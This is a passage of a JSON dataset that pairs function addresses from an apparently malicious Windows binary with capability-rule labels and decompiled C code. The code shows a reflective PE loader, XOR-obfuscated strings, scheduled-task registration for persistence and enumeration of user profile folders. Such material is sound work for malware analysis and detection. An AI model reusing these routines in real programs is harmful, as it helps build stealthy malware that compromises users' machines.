        "decompiled_code": "\nvoid __cdecl fcn.0040b3b0(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar12 = 0;\n    ppcVar9 = arg_8h[0xc];\n    if (ppcVar9 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar10 = *arg_8h;\n        arg_8h = ppcVar9;\n        (*pcVar10)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar9[0xf] + ppcVar9;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar9;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar9;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar8 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar9 = ppcVar1 + 0x210;\n                        do {\n                            iVar8 = iVar8 + 1;\n                            *ppcVar9 = cVar3;\n                            ppcVar9 = ppcVar9 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar8];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar8 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar8 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar8 < 0) {\n                        iVar8 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_8h = iVar5 + arg_8h;\n                        var_18h = iVar6 + arg_8h;\n                        while( true ) {\n                            ppcVar9 = *var_8h;\n                            if (ppcVar9 == NULL) break;\n                            if (ppcVar9 < 0) {\n                                if ((ppcVar9 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar9)) {\n                                    var_4h = *var_8h;\n                                    ppcVar9 = NULL;\n                                }\n                            }\n                            else {\n                                ppcVar9 = ppcVar9 + arg_8h;\n                            }\n                            if (ppcVar9 != NULL) {\n                                pcVar10 = ppcVar9 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar10;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar10[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar10;\n                                ppcVar9 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar8 = (*ppcVar1[2])(var_14h, ppcVar9, var_4h, &var_20h);\n                            if (iVar8 < 0) {\n                                iVar8 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_8h = var_8h + 1;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar8 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar10 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar11 = pcVar10 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar11;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        cVar7 = '\\x04';\n                    }\n                    else {\n                        cVar7 = (-((uVar2 & 0x80000000) != 0) & 2U) + 2;\n                    }\n                }\n                else {\n                    cVar7 = (-((uVar2 & 0x80000000) != 0) & 0x20U) + 0x20;\n                }\n                var_ch = puVar11[-7];\n                var_24h = puVar11[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, cVar7, &var_28h);\n                puVar11 = puVar11 + 10;\n                uVar12 = uVar12 + 1;\n                pcVar10 = var_10h;\n            } while (uVar12 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar10 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1586
    },
    "0040b635": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040b635(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint ARG_0;\n    uint lpDst;\n    uint var_84h;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t var_60h;\n    int32_t *var_5ch;\n    uint32_t var_58h;\n    int32_t *var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t *var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t pbstr;\n    \n    var_58h = 0;\n    var_38h = NULL;\n    var_30h = 0x7;\n    puVar9 = &lpDst;\n    var_5ch = in_EDX;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    if (*0x41bd40 == 0) {\n        var_28h = 0x4a22487d;\n        var_24h = 0x4c2a366a;\n        var_20h = 0x4a33480a;\n        var_1ch = 0x4c223676;\n        var_18h = 0x4a3e4819;\n        var_14h = 0x4c4a3677;\n        var_10h._0_2_ = 0x4858;\n        var_ch = 0x4a774858;\n        pbstr = 0x4c6f3639;\n        fcn.00401000(0x34);\n        uVar7 = 0;\n        do {\n            puVar1 = uVar7 + var_34h;\n            uVar4 = uVar7 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar7 = uVar7 + 1;\n            *puVar1 = *(&var_ch + uVar4) ^ puVar1[&var_28h - var_34h];\n        } while (uVar7 < 0x1a);\n    }\n    else {\n        var_2ch = 0x382d476e;\n        var_28h = 0x4b2a3179;\n        var_24h = 0x366d6e17;\n        var_20h = 0x470e6765;\n        var_1ch = 0x3178383c;\n        var_18h = 0x6e0a4b26;\n        var_14h = 0x6714367d;\n        var_10h._0_2_ = 0x474b;\n        var_ch = 0x386e474b;\n        pbstr = pbstr & 0xff000000 | 0x673136;\n        fcn.00401000(0x3c);\n        iVar6 = 0;\n        do {\n            puVar1 = iVar6 + var_34h;\n            iVar10 = iVar6 % var_30h;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_ch + iVar10) ^ puVar1[&var_2ch - var_34h];\n        } while (iVar6 < 0x1e);\n    }\n    piVar3 = var_34h;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_34h, &lpDst, 0x104);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    var_48h = 0x331d7014;\n    var_44h = 0x3150580b;\n    var_40h = 0x57336e03;\n    var_ch = 0x336e7031;\n    pbstr = pbstr & 0xff000000 | 0x755857;\n    fcn.00401000(0x18);\n    iVar6 = var_3ch;\n    iVar10 = 0;\n    do {\n        puVar1 = iVar10 + var_3ch;\n        iVar8 = iVar10 % var_30h;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_ch + iVar8) ^ puVar1[&var_48h - var_3ch];\n    } while (iVar10 < 0xc);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_3ch, &lpDst, arg_10h);\n    iVar10 = (**(*var_54h + 0x44))(var_54h, &var_38h);\n    if (-1 < iVar10) {\n        var_30h = NULL;\n        iVar10 = (**(*var_38h + 0x30))(var_38h, 0, &var_30h);\n        if (-1 < iVar10) {\n            var_50h = NULL;\n            iVar10 = (***var_30h)(var_30h, str.MbLk, &var_50h);\n            pcVar2 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n            if (-1 < iVar10) {\n                pbstr = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(arg_ch);\n                if (pbstr != 0) {\n                    iVar10 = (**(*var_50h + 0x2c))(var_50h, pbstr);\n                    if (-1 < iVar10) {\n                        var_34h = NULL;\n                        var_60h = (*pcVar2)(&ARG_0);\n                        pcVar2 = _sym.imp.OLEAUT32.dll_VariantClear;\n                        var_24h = var_24h & 0xffff0000;\n                        (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_74h);\n                        var_84h = var_74h;\n                        uStack132 = uStack116;\n                        uStack128 = uStack112;\n                        uStack124 = uStack108;\n                        (*pcVar2)(&var_4ch);\n                        iVar6 = (**(*var_5ch + 0x44))\n                                          (var_5ch, arg_8h, var_54h, 6, var_4ch, var_48h, var_44h, var_40h, var_24h, \n                                           var_20h, var_1ch, var_18h, 3, var_84h, uStack132, uStack128, uStack124, \n                                           &var_34h);\n                        pcVar2 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_4ch);\n                        (*pcVar2)(&var_74h);\n                        var_58h = -1 < iVar6;\n                        if (var_58h != 0) {\n                            (**(*var_34h + 8))(var_34h);\n                        }\n                        iVar6 = var_3ch;\n                        if (var_60h != 0) {\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_60h);\n                            iVar6 = var_3ch;\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                }\n                (**(*var_50h + 8))(var_50h);\n            }\n            (**(*var_30h + 8))(var_30h);\n        }\n        (**(*var_38h + 8))(var_38h);\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return var_58h;\n}\n",
        "token_count": 2085
    },
    "0040bcb6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040bcb6(uint noname_0, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint ARG_0;\n    uint lpDst;\n    int32_t *var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_3ch = 0;\n    var_40h = 7;\n    puVar8 = &lpDst;\n    var_44h = in_EDX;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = &ARG_0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    if (*0x41bd40 == 0) {\n        var_28h = 0x4a22487d;\n        var_24h = 0x4c2a366a;\n        var_20h = 0x4a33480a;\n        var_1ch = 0x4c223676;\n        var_18h = 0x4a3e4819;\n        var_14h = 0x4c4a3677;\n        var_10h._0_2_ = 0x4858;\n        var_8h = 0x4a774858;\n        var_4h = 0x4c6f3639;\n        fcn.00401000(0x34);\n        uVar6 = 0;\n        do {\n            puVar1 = uVar6 + var_ch;\n            uVar3 = uVar6 & 0x80000007;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n            }\n            uVar6 = uVar6 + 1;\n            *puVar1 = *(&var_8h + uVar3) ^ puVar1[&var_28h - var_ch];\n        } while (uVar6 < 0x1a);\n    }\n    else {\n        var_2ch = 0x382d476e;\n        var_28h = 0x4b2a3179;\n        var_24h = 0x366d6e17;\n        var_20h = 0x470e6765;\n        var_1ch = 0x3178383c;\n        var_18h = 0x6e0a4b26;\n        var_14h = 0x6714367d;\n        var_10h._0_2_ = 0x474b;\n        var_8h = 0x386e474b;\n        var_4h = var_4h & 0xff000000 | 0x673136;\n        fcn.00401000(0x3c);\n        iVar5 = 0;\n        do {\n            puVar1 = iVar5 + var_ch;\n            iVar7 = iVar5 % var_40h;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_2ch - var_ch];\n        } while (iVar5 < 0x1e);\n    }\n    iVar5 = var_ch;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_ch, &lpDst, 0x104);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    var_38h = 0x331d7014;\n    var_34h = 0x3150580b;\n    var_30h = 0x57336e03;\n    var_8h = 0x336e7031;\n    var_4h = var_4h & 0xff000000 | 0x755857;\n    fcn.00401000(0x18);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_ch;\n        iVar7 = iVar5 % var_40h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_38h - var_ch];\n    } while (iVar5 < 0xc);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_ch, &lpDst, arg_ch);\n    (**(*var_48h + 0x80))(var_48h, var_44h);\n    iVar5 = (**(*var_48h + 0x88))(var_48h, 0x40f6bc);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (((-1 < iVar5) && (iVar5 = (**(*var_48h + 0x70))(var_48h, 0x2000),  -1 < iVar5)) &&\n       (iVar5 = (**(*var_48h + 0x78))(var_48h, &ARG_0, 0),  -1 < iVar5)) {\n        (**(*var_48h + 0xa8))(var_48h, 0xfffffffe);\n        iVar5 = fcn.0040bb8c();\n        if (-1 < iVar5) {\n            var_3ch = 1;\n        }\n    }\n    uVar4 = (*pcVar2)(0, var_ch);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_3ch;\n}\n",
        "token_count": 1474
    },
    "0040bf99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040bf99(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    int16_t *piVar11;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *ppv;\n    int16_t *var_10h;\n    int32_t pszFirst;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_30h = 0x67146755;\n    var_34h = 0;\n    var_24h = NULL;\n    ppv = NULL;\n    var_20h = NULL;\n    var_1ch = 0;\n    var_18h = 0;\n    var_2ch = 0x31496721;\n    var_28h = 0x4d67784b;\n    pszFirst = 0x67786731;\n    var_8h._0_2_ = 0x674d;\n    var_8h._2_1_ = 0x6b;\n    fcn.00401000(0x18);\n    piVar4 = var_10h;\n    iVar9 = 0;\n    iVar6 = &var_30h - var_10h;\n    do {\n        var_10h = 0x7;\n        puVar1 = iVar9 + piVar4;\n        iVar8 = iVar9 % 7;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&pszFirst + iVar8) ^ puVar1[iVar6];\n    } while (iVar9 < 0xc);\n    iVar6 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar6) {\n        iVar6 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x40f670, 0, 1, 0x40f650, &ppv);\n        if ((-1 < iVar6) && (ppv != NULL)) {\n            iVar6 = (**(*ppv + 0x14))(ppv, &var_24h);\n            if ((-1 < iVar6) && (var_24h != NULL)) {\n                iVar6 = (**(*var_24h + 0xc))(var_24h, 0xf, &var_1ch, &var_18h);\n                pcVar3 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar6 && (var_18h != 0))) {\n                    do {\n                        var_18h = var_18h + -1;\n                        uVar7 = *(var_1ch + var_18h * 4);\n                        var_10h = uVar7;\n                        iVar6 = (**(*ppv + 0x18))(ppv, uVar7, 0x40f640, &var_20h);\n                        if ((-1 < iVar6) && (var_20h != NULL)) {\n                            pszFirst = 0;\n                            var_4h = NULL;\n                            iVar6 = (**(*var_20h + 0x84))(var_20h, &pszFirst);\n                            if ((-1 < iVar6) && (pszFirst != 0)) {\n                                iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41bd3c);\n                                if ((iVar6 != 0) &&\n                                   ((iVar6 = (**(*var_20h + 0x8c))(var_20h, &var_4h),  -1 < iVar6 && (var_4h != NULL))))\n                                {\n                                    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_4h, piVar4);\n                                    piVar5 = var_4h;\n                                    if ((iVar6 != 0) &&\n                                       (((*var_4h == 0x22 && (var_4h[2] == 0x3a)) && (var_4h[3] == 0x5c)))) {\n                                        puVar10 = &lpFileName;\n                                        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                            *puVar10 = 0;\n                                            puVar10 = puVar10 + 1;\n                                        }\n                                        piVar11 = piVar4;\n                                        do {\n                                            iVar2 = *piVar11;\n                                            piVar11 = piVar11 + 1;\n                                        } while (iVar2 != var_34h);\n                                        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar5, piVar4);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 1, \n                                                   ((iVar6 - var_4h >> 1) - 2) + (piVar11 - (piVar4 + 1) >> 1));\n                                        iVar6 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar7 = var_10h;\n                                        if (iVar6 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_10h);\n                                        }\n                                    }\n                                    (*pcVar3)(var_4h);\n                                }\n                                (*pcVar3)(pszFirst);\n                            }\n                            (**(*var_20h + 8))(var_20h);\n                        }\n                        (*pcVar3)(uVar7);\n                    } while (var_18h != 0);\n                    (*pcVar3)(var_1ch);\n                    iVar6 = (**(*var_24h + 0xc))(var_24h, 0xf, &var_1ch, &var_18h);\n                }\n                (**(*var_24h + 8))(var_24h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return;\n}\n",
        "token_count": 1460
    },
    "0040c302": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c302(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint lpcchSize;\n    uint ARG_0;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t lpMem;\n    uint lpFileName;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint lpProfileDir;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    uVar4 = (*pcVar2)(0, 0x208);\n    lpFileName = (*pcVar3)(uVar4);\n    uVar4 = (*pcVar2)(0, 0x208);\n    ARG_0 = (*pcVar3)(uVar4);\n    lpcchSize = 0x104;\n    var_28h = 0x6904331d;\n    var_24h = 0x5108783a;\n    var_20h = 0x59496b5f;\n    var_1ch = 0x3334692b;\n    var_18h = 0x782d691f;\n    var_14h = 0x6b5d5100;\n    var_10h = 0x690b590e;\n    var_ch = 0x693f330d;\n    var_8h = 0x5104783c;\n    var_4h._0_1_ = 0x43;\n    var_4h._1_1_ = 0x6b;\n    var_4h._2_2_ = 0x5969;\n    var_38h = 0x696b3351;\n    var_34h._0_2_ = 0x7859;\n    var_34h._2_1_ = 0x69;\n    fcn.00401000(0x50);\n    iVar8 = 0;\n    var_64h = 7;\n    do {\n        puVar1 = iVar8 + var_58h;\n        iVar6 = iVar8 % 7;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_38h + iVar6) ^ puVar1[&var_28h - var_58h];\n    } while (iVar8 < 0x28);\n    var_28h = 0x331f482a;\n    var_24h = 0x6d2b3711;\n    var_20h = 0x331b480a;\n    var_1ch = 0x6d333700;\n    var_18h = 0x33004827;\n    var_14h = 0x6d0e3702;\n    var_10h = 0x33334807;\n    var_ch = 0x6d0a3735;\n    var_8h = 0x331f4806;\n    var_4h._0_1_ = 0x61;\n    var_4h._1_1_ = 0x37;\n    var_30h = 0x336f486b;\n    var_2ch = 0x6d6f3761;\n    fcn.00401000(0x4c);\n    uVar4 = lpProfileDir;\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + lpMem;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_30h + uVar5) ^ puVar1[&var_28h - lpMem];\n    } while (uVar7 < 0x26);\n    var_74h = var_58h;\n    var_78h = lpMem;\n    iVar8 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    if (iVar8 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar4);\n        iVar8 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_60h = iVar8;\n        while (iVar8 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x40fb34);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x40fb38),  iVar6 != 0)) {\n                var_5ch = 0;\n                var_38h = 0x467c636d;\n                var_34h._0_2_ = 0x424c;\n                var_30h = 0x46566331;\n                var_2ch = var_2ch & 0xff000000 | 0x71424c;\n                var_54h = 0x6a6f6b6a;\n                var_50h = 0x64554948;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar4);\n                    fcn.00401000(0xc);\n                    iVar8 = var_70h;\n                    var_40h = 0;\n                    do {\n                        *(var_40h + var_70h) = *(&var_30h + var_40h % var_64h) ^ (var_40h + var_70h)[&var_38h - var_70h]\n                        ;\n                        var_40h = var_40h + 1;\n                    } while (var_40h < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, var_70h);\n                    var_14h = 0x6a1c6b4f;\n                    var_10h = 0x64704914;\n                    var_ch = 0x6a336b19;\n                    var_8h = 0x6426496d;\n                    var_4h._0_1_ = 0x6a;\n                    var_4h._1_1_ = 0x6b;\n                    fcn.00401000(0x24);\n                    iVar6 = var_44h;\n                    uVar7 = 0;\n                    do {\n                        puVar1 = uVar7 + var_44h;\n                        uVar5 = uVar7 & 0x80000007;\n                        if (uVar5 < 0) {\n                            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar7 = uVar7 + 1;\n                        *puVar1 = *(&var_54h + uVar5) ^ puVar1[&var_14h - var_44h];\n                    } while (uVar7 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, var_44h, lpProfileDir, &psz1, (&var_78h)[var_5ch]);\n                    fcn.004063c7(1);\n                    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    uVar4 = (*pcVar3)(0, iVar8);\n                    (*pcVar2)(uVar4);\n                    var_5ch = var_5ch + 1;\n                    uVar4 = lpProfileDir;\n                    iVar8 = var_60h;\n                } while (var_5ch < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar8, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar8);\n                iVar8 = -1;\n                var_60h = -1;\n            }\n        }\n    }\n    var_24h = 0x7304491c;\n    var_20h = 0x392a352e;\n    var_1ch = 0x5716573d;\n    var_18h = 0x496b5958;\n    var_14h = 0x35387338;\n    var_10h = 0x576c392d;\n    var_ch = 0x5961572f;\n    var_8h = 0x733a495c;\n    var_4h._0_1_ = 0x27;\n    var_4h._1_1_ = 0x35;\n    var_4h._2_2_ = 0x3959;\n    var_30h = 0x73574939;\n    var_2ch = var_2ch & 0xff000000 | 0x593557;\n    fcn.00401000(0x48);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_44h;\n        iVar6 = iVar8 % var_64h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_24h - var_44h];\n    } while (iVar8 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_44h, lpProfileDir, 0x104);\n    fcn.004063c7(1);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, ARG_0);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, lpProfileDir);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_44h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, var_58h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 2680
    },
    "0040c769": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
